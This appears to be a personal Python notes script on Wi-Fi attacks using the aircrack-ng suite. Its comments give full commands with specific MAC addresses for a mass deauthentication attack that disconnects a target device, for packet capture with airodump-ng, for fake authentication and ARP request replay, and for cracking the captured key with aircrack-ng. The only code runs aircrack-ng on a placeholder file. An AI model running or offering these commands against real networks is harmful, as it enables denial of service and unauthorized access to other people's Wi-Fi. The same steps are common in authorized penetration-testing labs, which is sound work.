#!/usr/bin/env python

import subprocess as s

interface = "wlan0"
airmon_interface = "wlan0mon"

# To Interupt and disconnect target's internet connection on WIFI
#                      number of packets, -a BSSIF  -c STATION a.k.a Device connected to router.
# aireplay-ng --deauth 100000000 -a 20:4E:7F:96:16:AA -c 82:B9:8B:C9:52:69 wlan0mon
"""
After Running airodump-ng and writing data to file,
airodump-ng --bssid 60:E3:27:93:8B:1B --channel 6 --write elPaso wlan0mon
Use this command,
aircrack-ng elPaso-01.cap 
elPaso-01.cap is the wireshark file generated.
"""
"""
Generate traffic with --fakeauth
aireplay-ng --fakeauth 0 -a <MACADDRESS> 
-h <FIRST 12 DIGITS of unspec field for wlan0mon> 
00-C0-CA-97-5B-F4 Replace - with coluns 00:C0:CA:97:5B:F4
FULL COMMAND,
aireplay-ng --fakeauth 0 -a 20:4E:7F:96:16:AA -h 00:C0:CA:97:5B:F4 wlan0mon
"""
"""
ARP Request Replay Attack
While airodump-ng is running,

Run airodump-ng --bssid 20:4E:7F:96:16:AA --channel 11 --write arpTest wlan0mon
then, Run 
aireplay-ng --fakeauth 0 -a 20:4E:7F:96:16:AA -h 00:C0:CA:97:5B:F4 wlan0mon
--fakeauth above to associate with network,
 then,
aireplay-ng --arpreplay -b 20:4E:7F:96:16:AA -h 00:C0:CA:97:5B:F4 wlan0mon

While above is running in two seperate terminal windows,
run, In Seperate Window.
aircrack-ng arpTest-01.cap

"""

s.call("aircrack-ng FILENAME", shell=True)
